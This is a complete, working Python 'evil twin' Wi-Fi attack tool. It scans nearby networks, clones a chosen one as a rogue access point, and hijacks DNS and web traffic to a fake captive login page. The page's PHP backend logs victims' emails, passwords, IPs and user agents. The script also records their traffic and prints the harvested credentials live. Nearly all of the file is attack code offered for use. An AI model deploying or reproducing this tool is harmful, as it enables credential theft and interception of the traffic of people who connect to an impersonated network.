#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import argparse
import subprocess
import datetime
import signal
import threading
import shutil
import re

# Ensure we're in the correct directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOGS_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "logs")

# Create logs directory if it doesn't exist
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)

# Global variables
stop_threads = False
hostapd_conf = None
dnsmasq_conf = None
apache_dir = None
processes = []

def signal_handler(sig, frame):
    global stop_threads
    print('\n[!] Attack interrupted by user. Cleaning up...')
    stop_threads = True
    cleanup()
    sys.exit(0)

def check_root():
    """Check if script is run as root"""
    if os.geteuid() != 0:
        print("[!] This script must be run as root.")
        sys.exit(1)

def check_tools():
    """Check if required tools are installed"""
    tools = ["airbase-ng", "airodump-ng", "dnsmasq", "tcpdump", "hostapd", "dhcpd"]
    missing = []
    
    for tool in tools:
        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
            missing.append(tool)
    
    if missing:
        print("[!] The following required tools are missing:")
        for tool in missing:
            print(f"    - {tool}")
        print("[!] Please install them to use this script.")
        print("[!] Typically: apt install aircrack-ng dnsmasq tcpdump hostapd isc-dhcp-server")
        sys.exit(1)

def setup_interface(interface):
    """Set up wireless interface for monitoring"""
    print(f"[*] Setting up {interface} for monitoring...")
    
    # Kill processes that might interfere with monitoring
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
    
    # Set interface to monitor mode
    subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL)
    
    # Determine monitor interface name
    mon_interface = interface
    if "mon" not in interface:
        mon_interface = f"{interface}mon"
        # Check if the mon interface exists, otherwise use the original
        result = subprocess.run(['ip', 'a', 'show', mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if result.returncode != 0:
            mon_interface = interface
    
    print(f"[+] Interface {mon_interface} ready in monitor mode")
    return mon_interface

def scan_for_networks(mon_interface):
    """Scan for available networks"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    scan_file = os.path.join(LOGS_DIR, f"scan_{timestamp}")
    
    print("[*] Scanning for nearby networks...")
    
    # Start airodump-ng in a separate process for 10 seconds
    scan_proc = subprocess.Popen(
        ['airodump-ng', '-w', scan_file, '--output-format', 'csv', mon_interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # Let it run for 10 seconds
    time.sleep(10)
    scan_proc.terminate()
    scan_proc.wait()
    
    # Parse the CSV file
    csv_file = f"{scan_file}-01.csv"
    networks = []
    
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
        # Find where the client list starts
        try:
            station_index = lines.index('\r\n') if '\r\n' in lines else lines.index('\n')
            ap_lines = lines[1:station_index]
            
            for line in ap_lines:
                if ',' not in line:
                    continue
                    
                parts = [part.strip() for part in line.split(',')]
                if len(parts) >= 14:
                    bssid = parts[0]
                    channel = parts[5]
                    essid = parts[13].strip()
                    
                    if essid and essid != "":
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid
                        })
        except (ValueError, IndexError) as e:
            print(f"[!] Error parsing scan results: {e}")
    else:
        print(f"[!] Scan file not found: {csv_file}")
    
    # Clean up temporary files
    for ext in ['csv', 'netxml']:
        file_path = f"{scan_file}-01.{ext}"
        if os.path.exists(file_path):
            os.remove(file_path)
    
    return networks

def create_ap_config(interface, essid, channel):
    """Create hostapd configuration"""
    global hostapd_conf
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    hostapd_conf = os.path.join(LOGS_DIR, f"hostapd_{timestamp}.conf")
    
    with open(hostapd_conf, 'w') as f:
        f.write(f"""interface={interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
""")
    
    return hostapd_conf

def create_dhcp_config(interface):
    """Create dnsmasq configuration for DHCP and DNS"""
    global dnsmasq_conf
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    dnsmasq_conf = os.path.join(LOGS_DIR, f"dnsmasq_{timestamp}.conf")
    
    with open(dnsmasq_conf, 'w') as f:
        f.write(f"""interface={interface}
dhcp-range=192.168.1.2,192.168.1.250,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.1.1
address=/#/192.168.1.1
""")
    
    return dnsmasq_conf

def create_fake_captive_portal():
    """Create fake login page for captive portal"""
    global apache_dir
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    apache_dir = os.path.join(LOGS_DIR, f"portal_{timestamp}")
    os.makedirs(apache_dir, exist_ok=True)
    
    # Create a simple but realistic login page
    with open(os.path.join(apache_dir, 'index.html'), 'w') as f:
        f.write("""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 400px;
            margin: 40px auto;
            padding: 20px;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        h2 {
            text-align: center;
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 3px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4285F4;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background-color: #3367D6;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .error {
            color: red;
            text-align: center;
            margin-bottom: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>WiFi Network Authentication</h2>
        </div>
        <div class="error" id="error-message">Invalid credentials. Please try again.</div>
        <form id="login-form" action="login.php" method="post">
            <div class="form-group">
                <label for="email">Email or Username</label>
                <input type="text" id="email" name="email" placeholder="Enter your email or username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            fetch('login.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('error-message').style.display = 'block';
                // Log the credentials but don't actually redirect
                console.log(email, password);
            });
        });
    </script>
</body>
</html>""")
    
    # Create a simple PHP script to capture credentials
    with open(os.path.join(apache_dir, 'login.php'), 'w') as f:
        f.write("""<?php
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];

// Log to file
$log_file = "credentials.txt";
$log_message = "$timestamp | IP: $ip | User-Agent: $user_agent | Email/Username: $email | Password: $password\n";
file_put_contents($log_file, $log_message, FILE_APPEND);

// Return an error to keep the user on the page
echo "error";
?>""")
    
    return apache_dir

def configure_interface(interface):
    """Configure interface with static IP"""
    print(f"[*] Configuring {interface} with static IP...")
    
    # Set interface down
    subprocess.run(['ip', 'link', 'set', 'dev', interface, 'down'], stdout=subprocess.DEVNULL)
    
    # Configure static IP
    subprocess.run(['ip', 'addr', 'flush', 'dev', interface], stdout=subprocess.DEVNULL)
    subprocess.run(['ip', 'addr', 'add', '192.168.1.1/24', 'dev', interface], stdout=subprocess.DEVNULL)
    
    # Set interface up
    subprocess.run(['ip', 'link', 'set', 'dev', interface, 'up'], stdout=subprocess.DEVNULL)
    
    print("[+] Interface configured with IP 192.168.1.1")

def setup_nat(interface):
    """Setup NAT for internet access if available"""
    print("[*] Setting up NAT forwarding...")
    
    # Enable IP forwarding
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], stdout=subprocess.DEVNULL)
    
    # Setup NAT
    subprocess.run(['iptables', '-F'])
    subprocess.run(['iptables', '-t', 'nat', '-F'])
    subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'])
    subprocess.run(['iptables', '-A', 'FORWARD', '-i', interface, '-o', 'eth0', '-j', 'ACCEPT'])
    subprocess.run(['iptables', '-A', 'FORWARD', '-i', 'eth0', '-o', interface, '-j', 'ACCEPT'])
    
    # Redirect all HTTP traffic to our portal
    subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', interface, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'])
    subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', interface, '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'])
    
    print("[+] NAT forwarding configured")

def run_fake_ap(interface, essid, channel, bssid=None):
    """Start fake AP using hostapd"""
    global stop_threads, processes
    
    # First reset interface from monitor mode if needed
    reset_interface(interface)
    original_interface = interface.replace('mon', '')
    
    # Create configurations
    hostapd_config = create_ap_config(original_interface, essid, channel)
    dnsmasq_config = create_dhcp_config(original_interface)
    portal_dir = create_fake_captive_portal()
    
    # Configure interface
    configure_interface(original_interface)
    
    # Setup NAT
    setup_nat(original_interface)
    
    # Start services
    print("[*] Starting rogue access point...")
    
    # Start hostapd (access point)
    hostapd_proc = subprocess.Popen(
        ['hostapd', hostapd_config],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processes.append(hostapd_proc)
    
    time.sleep(2)  # Give hostapd time to start
    
    if hostapd_proc.poll() is not None:
        print("[!] Failed to start hostapd. Check configuration.")
        cleanup()
        sys.exit(1)
    
    print(f"[+] Access point '{essid}' started on channel {channel}")
    
    # Start dnsmasq (DHCP + DNS)
    dnsmasq_proc = subprocess.Popen(
        ['dnsmasq', '-C', dnsmasq_config, '-d'],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processes.append(dnsmasq_proc)
    
    # Start PHP server
    os.chdir(portal_dir)
    php_proc = subprocess.Popen(
        ['php', '-S', '192.168.1.1:80'],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processes.append(php_proc)
    
    print("[+] Captive portal started at http://192.168.1.1")
    
    # Start packet capture
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_file = os.path.join(LOGS_DIR, f"evil_twin_capture_{timestamp}.pcap")
    
    tcpdump_proc = subprocess.Popen(
        ['tcpdump', '-i', original_interface, '-w', pcap_file, 'port 80 or port 443'],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processes.append(tcpdump_proc)
    
    print(f"[+] Packet capture started, saving to {pcap_file}")
    
    # Monitor for credentials
    cred_file = os.path.join(portal_dir, 'credentials.txt')
    
    print("[*] Evil twin attack running. Waiting for victims to connect...")
    print("[*] Press Ctrl+C to stop the attack")
    
    try:
        # Check for captured credentials periodically
        while not stop_threads:
            if os.path.exists(cred_file):
                # Check for new credentials
                with open(cred_file, 'r') as f:
                    credentials = f.read()
                
                if credentials.strip():
                    print("\n[+] Credentials captured:")
                    for line in credentials.strip().split('\n'):
                        if line not in ["", "\n"]:
                            print(f"    {line}")
            
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        
    print("[*] Stopping services...")
    cleanup()
    
    # Copy credentials to logs directory if any were captured
    if os.path.exists(cred_file) and os.path.getsize(cred_file) > 0:
        cred_log = os.path.join(LOGS_DIR, f"evil_twin_credentials_{timestamp}.txt")
        shutil.copy2(cred_file, cred_log)
        print(f"[+] Credentials saved to {cred_log}")
    
    print(f"[+] Packet capture saved to {pcap_file}")

def reset_interface(interface):
    """Reset interface to managed mode"""
    if 'mon' in interface:
        print(f"[*] Resetting {interface} to managed mode...")
        subprocess.run(['airmon-ng', 'stop', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', interface.replace('mon', ''), 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Interface {interface.replace('mon', '')} reset to managed mode")
    else:
        print(f"[*] Resetting {interface}...")
        subprocess.run(['ip', 'link', 'set', interface, 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Interface {interface} reset")

def cleanup():
    """Clean up temporary files and processes"""
    global processes, hostapd_conf, dnsmasq_conf, apache_dir
    
    # Kill all started processes
    for proc in processes:
        if proc.poll() is None:
            proc.terminate()
            proc.wait()
    
    # Clean up firewall rules
    subprocess.run(['iptables', '-F'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iptables', '-t', 'nat', '-F'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Stop services that might have been started
    for service in ['hostapd', 'dnsmasq', 'apache2']:
        subprocess.run(['service', service, 'stop'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print("[+] Cleanup complete")

def main():
    check_root()
    check_tools()
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    if args.rogue:
        # Skip monitor mode, directly setup the fake AP
        if not args.essid:
            print("[!] Error: ESSID is required for rogue AP mode")
            sys.exit(1)
        
        channel = args.channel if args.channel else "1"
        run_fake_ap(args.interface, args.essid, channel, args.bssid)
    else:
        # Normal mode: scan, select target, clone AP
        mon_interface = setup_interface(args.interface)
        
        if args.essid and args.channel:
            run_fake_ap(mon_interface, args.essid, args.channel, args.bssid)
        else:
            # Scan for networks
            networks = scan_for_networks(mon_interface)
            
            if not networks:
                print("[!] No networks found. Try scanning again.")
                reset_interface(mon_interface)
                sys.exit(1)
                
            # Display networks
            print("\nAvailable Networks:")
            print("------------------")
            for i, network in enumerate(networks):
                print(f"{i+1}. {network['essid']} (BSSID: {network['bssid']}, Channel: {network['channel']})")
                
            # Ask user to select a target
            selection = input("\nSelect network to clone (number) or 'q' to quit: ")
            if selection.lower() == 'q':
                reset_interface(mon_interface)
                sys.exit(0)
                
            try:
                index = int(selection) - 1
                if 0 <= index < len(networks):
                    target = networks[index]
                    run_fake_ap(
                        mon_interface,
                        target['essid'],
                        target['channel'],
                        target['bssid']
                    )
                else:
                    print("[!] Invalid selection.")
            except ValueError:
                print("[!] Invalid input.")
            
            reset_interface(mon_interface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WiFU: Evil Twin Attack Tool")
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface to use')
    parser.add_argument('-e', '--essid', help='ESSID (network name) to clone or create')
    parser.add_argument('-c', '--channel', help='Channel to use (default: 1)')
    parser.add_argument('-b', '--bssid', help='BSSID (MAC) to spoof')
    parser.add_argument('-r', '--rogue', action='store_true', help='Create a rogue AP instead of cloning an existing one')
    
    args = parser.parse_args()
    
    main()
